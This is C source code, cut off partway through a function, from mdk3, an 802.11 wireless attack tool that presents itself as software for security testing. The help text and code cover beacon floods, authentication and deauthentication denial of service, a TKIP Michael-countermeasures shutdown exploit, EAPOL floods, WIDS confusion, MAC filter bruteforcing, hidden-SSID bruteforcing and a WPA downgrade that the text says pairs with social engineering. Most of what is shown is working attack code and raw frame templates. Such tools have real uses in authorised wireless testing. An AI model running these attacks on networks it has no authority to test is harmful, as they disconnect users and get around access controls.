/*
 * mdk3, a 802.11 wireless network security testing tool
 *       Just like John the ripper or nmap, now part of most distros,
 *       it is important that the defender of a network can test it using
 *       aggressive tools.... before somebody else does.
 *
 * This file contains parts from 'aircrack' project by Cristophe Devine.
 *
 * Copyright (C) 2006-2010 Pedro Larbig
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

//Using GNU Extension getline(), not ANSI C
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <sys/time.h>
#include <pcap.h>

#include "osdep.h"
#include "debug.h"
#include "helpers.h"
#include "mac_addr.h"

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

#define VERSION "v7"

#define MICHAEL \
    "\x08\x41\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B\x00\x00\x00\x20\x00\x00\x00\x00"

#define	MAX_PACKET_LENGTH 4096
#define	MAX_APS_TRACKED 100
#define MAX_APS_TESTED 100

# define TIMEVAL_TO_TIMESPEC(tv, ts) {                                  \
        (ts)->tv_sec = (tv)->tv_sec;                                    \
        (ts)->tv_nsec = (tv)->tv_usec * 1000;                           \
}

#define LIST_REREAD_PERIOD 3

struct pckt
{
	unsigned char *data;
	int len;
} pckt;

struct advap
{
	char *ssid;
	struct ether_addr mac;
} advap;



struct ia_stats
{
  int c_authed;
  int c_assoced;
  int c_kicked;
  int c_created;

  int d_captured;
  int d_sent;
  int d_responses;
  int d_relays;
} ia_stats;

struct beaconinfo
{
  unsigned char *bssid;
  unsigned char *ssid;
  int ssid_len;
  int channel;
  unsigned char capa[2];
};

struct wids_stats
{
    int clients;
    int aps;
    int cycles;
    int deauths;
} wids_stats;

unsigned char tmpbuf[MAX_PACKET_LENGTH];     // Temp buffer for packet manipulation in send/read_packet
unsigned char pkt[MAX_PACKET_LENGTH];                // Space to save generated packet
unsigned char pkt_sniff[MAX_PACKET_LENGTH];          // Space to save sniffed packets
unsigned char pkt_check[MAX_PACKET_LENGTH];          // Space to save sniffed packets to check success
unsigned char aps_known[MAX_APS_TRACKED][ETHER_ADDR_LEN];          // Array to save MACs of known APs
int aps_known_count = 0;                     // Number of known APs
unsigned char auth[MAX_APS_TESTED][ETHER_ADDR_LEN];      // Array to save MACs of APs currently under test
int auths[MAX_APS_TESTED][4];                // Array to save status of APs under test
int auth_count;                              // Number of APs under test
int showssidwarn1=1, showssidwarn2=1;        // Show warnings for overlenght SSIDs
unsigned char *mac_sa = NULL;                        // Deauth test: Sender/Client MAC
unsigned char *mac_ta = NULL;                        //              Transmitter/BSSID MAC
int state = 0, wds = 0;                      // Current state of deauth algo
unsigned char *pkt_amok = NULL;                      // Pointer to packet for deauth mode
unsigned char *target = NULL;                        // Target for SSID Bruteforce / Intelligent Auth DoS
int exit_now = 0;                            // Tells main thread to exit
int ssid_len = 0;                            // Length of SSID used in Bruteforce mode
int ssid_eof = 0;                            // Tell other threads, SSID file has reached EOF
char brute_mode;                             // Which ASCII-characters should be used
char *brute_ssid;                            // SSID in Bruteforce mode
unsigned int end = 0;                        // Has Bruteforce mode tried all possibilities?
unsigned int turns = 0;                      // Number of tried SSIDs
unsigned int max_permutations = 1;           // Number of SSIDs possible
int real_brute = 0;                          // use Bruteforce mode?
int init_intelligent = 0;                    // Is intelligent_auth_dos initialized?
int init_intelligent_data = 0;               // Is its data list initialized?
int we_got_data = 0;                         // Sniffer thread tells generator thread if there is any data
struct clist cl;                             // List with clients for intelligent Auth DoS
struct clist *current = &cl;                 // Pointer to current client
struct clist a_data;                         // List with data frames for intelligent Auth DoS
struct clist *a_data_current = &a_data;      // And a pointer to its current frame
unsigned char *essid;                                // Pointer to ESSID for WIDS confusion
int essid_len;                               // And its length
int init_wids = 0;                           // Is WIDS environment ready?
struct clistwidsap clwa;                     // AP list for WIDS confusion
struct clistwidsap *clwa_cur = &clwa;        // Current item
struct clistwidsclient clwc;                 // CLient list for WIDS confusion
struct clistwidsclient *clwc_cur = &clwc;    // Current item
struct clistwidsap zc_own;                   // List of own APs for Zero's exploit
struct clistwidsap *zc_own_cur = &zc_own;    // Current own AP for Zero
int init_zc_own = 0;                         // Is Zero's List ready?
int init_aplist = 0;                         // Is List of APs for WIDS confusion ready?
int init_clientlist = 0;                     // Is list of clients ready?
struct ether_addr mac_base;                  // First three bytes of adress given for bruteforcing MAC filter
struct ether_addr mac_lower;                 // Last three bytes of adress for Bruteforcing MAC filter
int mac_b_init = 0;                          // Initializer for MAC bruteforcer
static pthread_mutex_t has_packet_mutex;     // Used for condition below
static pthread_cond_t has_packet;            // Pthread Condition "Packet ready"
int has_packet_really = 0;                   // Since the above condition has a timeout we want to use, we need another int here
static pthread_mutex_t clear_packet_mutex;   // Used for condition below
static pthread_cond_t clear_packet;          // Pthread Condition "Buffer cleared, get next packet"
struct timeval tv_dyntimeout;                // Dynamic timeout for MAC bruteforcer
int mac_brute_speed = 0;                     // MAC Bruteforcer Speed-o-meter
int mac_brute_timeouts = 0;                  // Timeout counter for MAC Bruteforcer
int zc_exploit = 0;                          // Use Zero_Chaos attack or standard WDS confusion?
int hopper_seconds = 1;                      // Default time for channel hopper to stay on one channel
int useqosexploit = 0;                       // Is 1 when user decided to use better TKIP QoS Exploit
int wpad_cycles = 0, wpad_auth = 0;          // Counters for WPA downgrade: completed deauth cycles, sniffed 802.1x auth packets
int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: sniffed WEP/open packets, sniffed beacons/sec



#define PKT_EAPOL_START \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x01\x00\x00"

#define PKT_EAPOL_LOGOFF \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x02\x00\x00"

#define EAPOL_TEST_START_FLOOD 0
#define EAPOL_TEST_LOGOFF      1
#define FLAG_AUTH_WPA     1
#define FLAG_AUTH_RSN     2
#define FLAG_TKIP         1
#define FLAG_CCMP         2
#define SUPP_RATES        "\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"  // supported rates (1;2;5,5;11;6;9;12;18)
#define EXT_RATES         "\x32\x04\x30\x48\x60\x6c"                  // extended rates (24;36;48;54)
#define IE_WPA            "\x00\x50\xf2\x01\x01\x00"
#define IE_WPA_TKIP       "\x00\x50\xf2\x02"
#define IE_WPA_CCMP       "\x00\x50\xf2\x04"
#define IE_WPA_KEY_MGMT   "\x00\x50\xf2\x01"
#define IE_RSN            "\x30\x12\x01\x00"
#define IE_RSN_TKIP       "\x00\x0f\xac\x02"
#define IE_RSN_CCMP       "\x00\x0f\xac\x04"
#define IE_RSN_KEY_MGMT   "\x00\x0f\xac\x01"

int eapol_test;                              // the actual EAPOL test
int eapol_state = 0;                         // state of the EAPOL FSM
unsigned char eapol_src[ETHER_ADDR_LEN];                // src address used for EAPOL frames
unsigned char eapol_dst[ETHER_ADDR_LEN];                // dst address used for EAPOL frames
int eapol_wtype = FLAG_AUTH_WPA;             // default auth type: WPA
int eapol_ucast = FLAG_TKIP;                 // default unicast cipher: TKIP
int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP


		"TEST MODES:\n"
		"b   - Beacon Flood Mode\n"
		"      Sends beacon frames to show fake APs at clients.\n"
		"      This can sometimes crash network scanners and even drivers!\n"
		"a   - Authentication DoS mode\n"
		"      Sends authentication frames to all APs found in range.\n"
		"      Too many clients freeze or reset some APs.\n"
		"p   - Basic probing and ESSID Bruteforce mode\n"
		"      Probes AP and checks for answer, useful for checking if SSID has\n"
		"      been correctly decloaked or if AP is in your sending range.\n"
		"      SSID Bruteforcing is also possible with this mode.\n"
		"d   - Deauthentication / Disassociation aka \"Amok Mode\"\n"
		"      Waits for data packets and disconnects their source and destination\n"
		"      with Deauthentication and Disassociation messages.\n"
		"m   - Michael Countermeasures Shutdown Exploit (TKIP DoS)\n"
		"      Cancels all traffic continuously by faking a replay attack or by\n"
		"      injecting bursts of malformed packets.\n"
		"x   - 802.1X tests\n"
		"      EAP tests for WPA(2). Can flood EAPOL start and EAPOL logoff messages.\n"
		"w   - WIDS/WIPS Confusion\n"
		"      Confuse/Abuse Intrusion Detection and Prevention Systems by\n"
		"      cross-connecting clients to multiple WDS nodes or fake rogue APs.\n"
		"f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. More effective in\n"
		"      combination with social engineering.\n";


char use_beac[]="b   - Beacon Flood Mode\n"
		"      Sends beacon frames to generate fake APs at clients.\n"
		"      This can sometimes crash network scanners and drivers!\n"
		"      OPTIONS:\n"
		"      -n <ssid>\n"
		"         Use SSID <ssid> instead of randomly generated ones\n"
		"      -f <filename>\n"
		"         Read SSIDs from file\n"
		"      -v <filename>\n"
		"         Read MACs and SSIDs from file. See example file!\n"
		"      -d\n"
		"         Show network as Ad-Hoc node\n"
		"      -w\n"
		"         Set WEP bit (Generates encrypted networks)\n"
		"      -g\n"
		"         Create networks with 54 Mbit instead of 11 Mbit\n"
		"      -t\n"
		"         Create networks using WPA TKIP encryption\n"
		"      -a\n"
		"         Create networks using WPA AES encryption\n"
		"      -m\n"
		"         Use valid accesspoint MAC from built-in OUI database\n"
		"      -h\n"
		"         Hop to channel where network is spoofed\n"
		"         This makes the test more effective against some devices/drivers\n"
		"         But it reduces packet rate due to channel hopping.\n"
		"      -c <chan>\n"
		"         Create fake networks on channel <chan>. If you want your card to\n"
		"         hop on this channel, you have to set -h option, too.\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: 50)\n";

char use_auth[]="a   - Authentication DoS mode\n"
		"      Sends authentication packets to all APs found in range.\n"
		"      Too many clients may freeze or reset several APs.\n"
		"      OPTIONS:\n"
		"      -a <ap_mac>\n"
		"         Only test the specified AP\n"
		"      -m\n"
		"         Use valid client MAC from built-in OUI database\n"
		"      -c\n"
		"         Do NOT check for test being successful\n"
		"      -i <ap_mac>\n"
		"         Perform intelligent test on AP (-a and -c will be ignored)\n"
		"         This test connects clients to the AP and reinjects sniffed data to keep them alive.\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: unlimited)\n";

char use_prob[]="p   - Basic probing and ESSID Bruteforce mode\n"
		"      Probes AP and checks for answer, useful for checking if SSID has\n"
		"      been correctly decloaked or if AP is in your sending range\n"
		"      Use -f and -t option to enable SSID Bruteforcing.\n"
		"      OPTIONS:\n"
		"      -e <ssid>\n"
		"         Tell mdk3 which SSID to probe for\n"
		"      -f <filename>\n"
		"         Read lines from file for bruteforcing hidden SSIDs\n"
		"      -t <bssid>\n"
		"         Set MAC adress of target AP\n"
		"      -s <pps>\n"
		"         Set speed (Default: unlimited, in Bruteforce mode: 300)\n"
		"      -b <character set>\n"
		"         Use full Bruteforce mode (recommended for short SSIDs only!)\n"
		"         Use this switch only to show its help screen.\n"
		"      -r\n"
		"         Activates RenderMan's discovery tool to politely scan hidden\n"
		"         networks for a list of known SSIDs\n";

char use_deau[]="d   - Deauthentication / Disassociation Amok Mode\n"
		"      Kicks everybody found from AP\n"
		"      OPTIONS:\n"
		"      -w <filename>\n"
		"         Read file containing MACs not to care about (Whitelist mode)\n"
		"      -b <filename>\n"
		"         Read file containing MACs to run test on (Blacklist Mode)\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: unlimited)\n"
		"      -c [chan,chan,chan,...]\n"
		"         Enable channel hopping. Without providing any channels, mdk3 will hop an all\n"
		"         14 b/g channels. Channel will be changed every 5 seconds.\n";

char use_mich[]="m   - Michael shutdown exploitation (TKIP)\n"
		"      Cancels all traffic continuously\n"
		"      -t <bssid>\n"
		"         Set Mac address of target AP\n"
		"      -w <seconds>\n"
		"         Seconds between bursts (Default: 10)\n"
		"      -n <ppb>\n"
		"         Set packets per burst (Default: 70)\n"
		"      -j\n"
		"         Use the new TKIP QoS-Exploit\n"
		"         Needs just a few packets to shut AP down!\n"
		"      -s <pps>\n"
		"         Set speed (Default: 400)\n";

char use_eapo[]="x   - 802.1X tests\n"
		"      0 - EAPOL Start packet flooding\n"
		"            -n <ssid>\n"
		"               Use SSID <ssid>\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -w <WPA type>\n"
		"               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)\n"
		"            -u <unicast cipher>\n"
		"               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -m <multicast cipher>\n"
		"               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n"
		"      1 - EAPOL Logoff test\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -c <bssid>\n"
		"               Set MAC address of target STA\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n";

char use_wids[]="w   - WIDS/WIPS/WDS Confusion\n"
		"      Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
		"      -e <SSID>\n"
		"         SSID of target WDS network\n"
		"      -c [chan,chan,chan...]\n"
		"         Use channel hopping\n"
		"      -z\n"
		"         activate Zero_Chaos' WIDS exploit\n"
		"         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n";

char use_macb[]="f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"      -t <bssid>\n"
		"         Target BSSID\n"
		"      -m <mac>\n"
		"         Set the MAC adress range to use (3 bytes, i.e. 00:12:34)\n"
		"         Without -m, the internal database will be used\n"
		"      -f <mac>\n"
		"         Set the MAC adress to begin bruteforcing with\n"
		"         (Note: You can't use -f and -m at the same time)\n";

char use_wpad[]="g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. mdk3 will let WEP and unencrypted\n"
		"      clients work, so if the sysadmin simply thinks \"WPA is broken\" he\n"
		"      sure isn't the right one for this job.\n"
		"      (this can/should be combined with social engineering)\n"
		"      -t <bssid>\n"
		"         Target network\n";


//ATTACK Bruteforce SSID
void bruteforce_ssid()
{
    int i;
    switch (brute_mode) {
	case 'n' :	// Numbers only
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 10;
		brute_ssid[i] = 48;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == '9' + 1) {
		brute_ssid[i] = '0';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('9' + 1)) end = 1;
	break;

	case 'l' :	// only lowercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 26;
		brute_ssid[i] = 97;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('z' + 1))  end = 1;
	break;

	case 'u' :	// only uppercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 26;
		brute_ssid[i] = 65;
	    }
	brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = 'A' ;
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('Z' +1 )) end = 1;
	break;

	case 'c' :	// lower- and uppercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0;i<ssid_len;i++) {
		max_permutations *= 52;
		brute_ssid[i] = 65;
	    }
	brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'A';
	    }
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('Z' + 1)) end = 1;
	break;

	case 'm' :	// lower- and uppercase characters plus numbers
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 62;
		brute_ssid[i]=48;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'A';
	    }
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = '0';
	    }
	    if (brute_ssid[i] == '9' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('9' + 1))  end = 1;
	break;

	case 'a' :	// all printable characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 95;
		brute_ssid[i] = 32;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == '~' + 1) {
		brute_ssid[i] = ' ';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('~' + 1))  end = 1;
	break;
	default : printf("\nYou have to specify a set of characters (a,l,u,n,c,m)!\n");
	exit(0);
	break;
    }

}


//ATTACK Beacon Floog
struct advap get_fakeap_from_file()
{
    //TODO: This is a memory leak nightmare
    // parsed mac, line, ssid, all those need to be freed somewhere!
  
    struct advap fakeap;
    char *line;
    int t;
    char *ssid;

skipl:

    line = read_line_from_file(0);

    for (t=0; t<256; t++) {  //Lets see if we have a dirty bitch...
	if ((line[t] == ' ' && t<11) || (line[t] == '\0' && t<12) || (line[t] == '\n' && t<12)) {
	    printf("Malformed SSID file! Skipping line: %s\n", line);
	    goto skipl;
	}
	if (line[t] == ' ') break;  // Position of first space stored in t
    }

    ssid = line+t+1;

    fakeap.ssid = ssid;
    fakeap.mac = parse_mac(line);

    return fakeap;
}

//packet.h
int is_from_target_ap(unsigned char *targetap, unsigned char *packet)
{

	unsigned char *bss = NULL;
	unsigned char ds = packet[1] & 3;	//Set first 6 bits to 0

	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		bss = packet + 16;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		bss = packet + 4;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		bss = packet + 10;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		bss = packet + 10;
		break;
	}

    if (!memcmp(targetap, bss, 6)) return 1;
    return 0;
}

//Returns pointer to the desired MAC Adresses inside a packet
//Type: s => Station
//      a => AP
//      b => BSSID
//packet.h
unsigned char *get_macs_from_packet(char type, unsigned char *packet)
{
    unsigned char *bssid, *station, *ap;

    //Ad-Hoc Case!
    bssid = packet + 16;
    station = packet + 10;
    ap = packet + 4;

    if ((packet[1] & '\x01') && (!(packet[1] & '\x02'))) {	// ToDS packet
	bssid = packet + 4;
	station = packet + 10;
	ap = packet + 16;
    }
    if ((!(packet[1] & '\x01')) && (packet[1] & '\x02')) {	// FromDS packet
	station = packet + 4;
	bssid = packet + 10;
	ap = packet + 16;
    }
    if ((packet[1] & '\x01') && (packet[1] & '\x02')) {		// WDS packet
	station = packet + 4;
	bssid = packet + 10;
	ap = packet + 4;
    }

    switch(type) {

    case 's':
	return station;

    case 'a':
	return ap;

    case 'b':
	return bssid;
    }

    return NULL;
}

//packet.h
struct beaconinfo parse_beacon(unsigned char *frame, int framelen)
{
    struct beaconinfo bi;
    bi.ssid = NULL;
    bi.ssid_len = 0;
    bi.channel = 0;
    int pos = 36;

    while (pos < framelen) {
	switch (frame[pos]) {
	case 0x00: //SSID
	    bi.ssid_len = (int) frame[pos+1];
	    bi.ssid = frame+pos+2;
	break;
	case 0x03: //Channel
	    bi.channel = (int) frame[pos+2];
	break;
	}
	pos += (int) frame[pos+1] + 2;
    }

    bi.capa[0] = frame[34];
    bi.capa[1] = frame[35];
    bi.bssid = frame+10;

    return bi;
}

//Do we still need this? This looks awful
//If yes, helpers.h??
void tvdiff(struct timeval *tv2, struct timeval *tv1, struct timeval *diff)
{
  if ((diff == NULL) || (tv2 == NULL && tv1 == NULL))
    return;
  else if (tv2 == NULL) {
    diff->tv_sec  = -1 * tv1->tv_sec;
    diff->tv_usec = -1 * tv1->tv_usec;
  } else if (tv1 == NULL) {
    diff->tv_sec  = tv2->tv_sec;
    diff->tv_usec = tv2->tv_usec;
  } else if (tv2->tv_sec == tv1->tv_sec) {
    /* No wrapping */
    diff->tv_sec = 0;
    diff->tv_usec = tv2->tv_usec - tv1->tv_usec;
  } else {
    /* Wrapped >= one or more times. Since the final usec value is less than
     * the original we only increased time by tv1->tv_sec - tv2->tv_sec - 1
     * seconds.
     * */
    diff->tv_sec  = (tv2->tv_sec - tv1->tv_sec) - 1;
    diff->tv_usec = 1000000l - tv1->tv_usec + tv2->tv_usec;
    if (diff->tv_usec >= 1000000l) {
      diff->tv_sec++;
      diff->tv_usec -= 1000000l;
    }
  }
  if (diff->tv_sec < 0) {
    diff->tv_sec--;
    diff->tv_usec -= 1000000l;
  }
}


/* Sniffing Functions */

//ATTACK Auth Flood
unsigned char *get_target_ap()
{
// Sniffing for beacon frames to find target APs
// Tries to to find NEW AP when called, saves already reported APs in aps_known[] array
// If it cannot find a new AP within 100 frames it either choses a random known AP
// or if no APs were ever found it keeps sniffing.

    int len = 0;
    int t, u, known;
    unsigned char rnd;

    keep_waiting: // When nothing ever found this is called after the sniffing loop

    for (t=0; t<100; t++)
    {
	len = 0;
	while (len < 22)
	    len = osdep_read_packet(pkt_sniff, 4096);
	known = 0;   // Clear known flag
	if (! memcmp(pkt_sniff, "\x80", 1)) {   //Filter: let only Beacon frames through
	    for (u=0; u<aps_known_count; u++)
	    {
		if (! memcmp(aps_known[u], pkt_sniff+16, 6)) { 
		    known = 1; 
		    break;
		}   // AP known => Set known flag
	    }
	    if (! known)  // AP is NEW, copy MAC to array and return it
	    {
		memcpy(aps_known[aps_known_count], pkt_sniff+16, ETHER_ADDR_LEN);
		aps_known_count++;

		if ((unsigned int) aps_known_count >=
			sizeof (aps_known) / sizeof (aps_known[0]) ) {
			fprintf(stderr, "exceeded max aps_known\n");
			exit (1);
		}

		return pkt_sniff+16;
	    }
	}
    }

    // No new target found within 100 packets
    // If there are no beacons at all, wait for some to appear
    if (aps_known_count == 0)
	goto keep_waiting;

    // Pick random known AP to try once more
    rnd = random() % aps_known_count;

    return (unsigned char *) aps_known[rnd];
}

//unsure, attack? packet.h?
unsigned char *get_target_deauth()
{
// Sniffing for data frames to find targets

    int len = 0;

    pktsux:
    len = 0;
    while (len < 22) len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
    if (! memcmp(pkt_sniff, "\x08", 1))
	return pkt_sniff;
    if (! memcmp(pkt_sniff, "\x88", 1))
	return pkt_sniff;
    goto pktsux;

}

//ATTACK SSID bruteforce
struct pckt get_target_ssid()
{
    struct pckt ssid;
    unsigned char *zero_ssid;
    int len=0;

//Sniff packet
    printf("Waiting for beacon frame from target...\n");

    while (1) {
	len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	if (len < 22) continue;
	if (! memcmp(pkt_sniff, "\x80", 1)) {
	    if (! memcmp(target, pkt_sniff+16, ETHER_ADDR_LEN)) break;
	}
    }

//Find SSID tag in frame
    if (pkt_sniff[36] != '\x00') {
	printf("\nUNPARSABLE BEACON FRAME!\n");
	exit_now = 1;
    }
    if (pkt_sniff[37] > 32) printf("\nWARNING: NON-STANDARD BEACON FRAME, SSID LENGTH > 32\n");

//Analyze tag, Check if matching 0x00
    if (pkt_sniff[37] == '\x00') {
	printf("\nFound SSID length 0, no information about real SSIDs length available.\n");
    } else if (pkt_sniff[37] == '\x01') {
	printf("\nFound SSID length 1, usually a placeholder, no information about real SSIDs length available.\n");
    } else {
	zero_ssid = (unsigned char *) malloc(pkt_sniff[37]);
	memset(zero_ssid, '\x00', pkt_sniff[37]);
	if (! memcmp(pkt_sniff+38, zero_ssid, pkt_sniff[37])) {
	    printf("\nSSID is hidden. SSID Length is: %d.\n", pkt_sniff[37]);
	} else {
	    pkt_sniff[38+pkt_sniff[37]] = '\x00';
	    printf("\nSSID does not seem to be hidden! Found: \"%s\"\n", pkt_sniff+38);
	    exit_now = 1;
	}
    }

//return SSID string in packet struct
    pkt_sniff[38+pkt_sniff[37]] = '\x00';
    ssid.len = pkt_sniff[37];
    ssid.data = pkt_sniff+38;

    return ssid;
}

//ATTACK SSID bruteforce
void ssid_brute_sniffer()
{
    printf("Sniffer thread started\n");
    int len=0;
    int i;
    int no_disp;
//infinite loop
    while (1) {
//sniff packet
	len = osdep_read_packet(pkt_check, MAX_PACKET_LENGTH);
//is probe response?
	if (! memcmp(pkt_check, "\x50", 1)) {
//parse + print response
	    unsigned char *mac = pkt_check+16;
	    unsigned char slen = pkt_check[37];
	    pkt_check[38+slen] = '\x00';
	    no_disp = 0;
	    for (i=0; i<aps_known_count; i++) {
		if (!memcmp(aps_known[i], mac, ETHER_ADDR_LEN)) no_disp = 1;
	    }
	    if (!exit_now && !no_disp) {
		printf("\nGot response from %02X:%02X:%02X:%02X:%02X:%02X, SSID: \"%s\"\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_check+38);
		printf("Last try was: %s\n", brute_ssid);
	    }
	    if (!no_disp) {
		memcpy(aps_known[aps_known_count], mac, ETHER_ADDR_LEN);
		aps_known_count++;
		if ((unsigned int) aps_known_count >=
			sizeof (aps_known) / sizeof (aps_known[0]) ) {
			fprintf(stderr, "exceeded max aps_known\n");
			exit (1);
		}
	    }
//If response is from target, exit mdk3
	    if (target != NULL) { 
		if (!memcmp(pkt_check+16, target, ETHER_ADDR_LEN)) {
		    exit_now = 1;
		}
	    }
	}
//loop
    }
}

//ATTACK Intelligent Auth Flood
void intelligent_auth_sniffer()
{
    // Cannot use pkt_sniff here, its used in packet generator thread already!
    unsigned char pkt_auth[MAX_PACKET_LENGTH];
    //static int sniffer_initialized = 0;
    int plen;
    struct clist *search;
    unsigned long data_size = 0;
    unsigned long max_data_size = 33554432L;	// mdk will store up to 32 MB of captured traffic
    int size_warning = 0;
    unsigned char *src = NULL;
    unsigned char *dst = NULL;
    unsigned char ds;

    // Note: Client list is setup by packet generator prior to sniffer start, so there are no race conditions

    // Client status descriptions:
    // 0 : not authed, not associated (kicked / new)
    // 1 : authed but not yet associated
    // 2 : connected (can inject data now)

    while (1) {
	plen = osdep_read_packet(pkt_auth, MAX_PACKET_LENGTH);

	if (!is_from_target_ap(target, pkt_auth)) continue;	// skip packets from other sources

	switch (pkt_auth[0]) {

	case 0xB0:  //0xB0
	    // Authentication Response
	    // We don't care about the status code, just making the AP busy in case of failure!
	    search = search_data(current, pkt_auth + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
		search->status = 1;
		ia_stats.c_authed++;
	    }
	    break;

	case 0x10:  //0x10
	    // Association Response
	    // Again, we don't care if its successful, we just send data to
	    // let the AP do some work when deauthing the fake client again
	    search = search_data(current, pkt_auth + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
		search->status = 2;
		ia_stats.c_assoced++;
	    }
	    break;

	case 0xC0:  //0xC0
	    // Deauthentication
	case 0xA0:  //0xA0
	    // Disassociation
	    search = search_data(current, pkt_auth + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status != 0) {	//Count only one deauth if the AP does flooding
		search->status = 0;
		ia_stats.c_kicked++;
	    }
	    break;

	case 0x08:  //0x08
	    // Data packet
	    // Take care about ToDS and FromDS since they change MAC position in packet!
	    ds = pkt_auth[1] & 3;		//Set first 6 bits to 0
	    switch (ds) {
